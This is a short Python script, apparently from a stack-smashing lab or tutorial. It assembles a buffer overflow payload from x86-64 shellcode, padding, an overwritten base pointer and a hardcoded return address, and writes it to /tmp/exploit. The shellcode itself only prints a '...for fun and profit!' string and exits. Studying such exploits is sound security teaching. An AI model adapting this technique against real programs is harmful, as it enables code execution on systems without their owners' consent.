#!/usr/bin/env python3
buf_size  = 128
shellcode = b'\xbf\x01\x00\x00\x00\x48\x8d\x75' + \
            b'\xe8\xba\x18\x00\x00\x00\xb8\x01' + \
            b'\x00\x00\x00\x0f\x05\x31\xff\xb8' + \
            b'\x3c\x00\x00\x00\x0f\x05'
# These must be set based on runtime values.
retaddr   = b'\x00\xd1\xff\xff\xff\x7f\x00\x00'
bp        = b'\x80\xd1\xff\xff\xff\x7f\x00\x00'
string    = b'...␣for␣fun␣and␣profit!\x00'
newline   = b'\n'
space     = b'A' * (buf_size - len(shellcode) - len(string))
f = open("/tmp/exploit", "wb")
f.write(shellcode + space + string + bp + retaddr + newline)
f.close()